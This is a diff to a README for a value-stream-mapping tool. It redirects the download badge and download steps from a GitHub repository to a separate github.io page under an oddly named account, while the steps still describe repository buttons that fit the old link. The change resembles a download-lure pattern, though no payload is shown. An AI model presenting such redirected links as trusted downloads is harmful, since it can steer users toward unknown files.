@@ -1,6 +1,6 @@
 # 📊 vsm-flow-studio-2026 - Streamline your lean process mapping effortlessly
 
-[![](https://img.shields.io/badge/Download-VSM_Flow_Studio-blue.svg)](https://github.com/unreceptive-wildbillhickock799/vsm-flow-studio-2026)
+[![](https://img.shields.io/badge/Download-VSM_Flow_Studio-blue.svg)](https://unreceptive-wildbillhickock799.github.io)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ The application uses standard web technologies. You do not need to install extra
 
 You obtain the files directly from the repository page. 
 
-1. Visit [https://github.com/unreceptive-wildbillhickock799/vsm-flow-studio-2026](https://github.com/unreceptive-wildbillhickock799/vsm-flow-studio-2026).
+1. Visit [https://unreceptive-wildbillhickock799.github.io](https://unreceptive-wildbillhickock799.github.io).
 2. Look for the green button labeled Code.
 3. Select Download ZIP from the menu.
 4. Save the folder to your desktop or downloads directory.
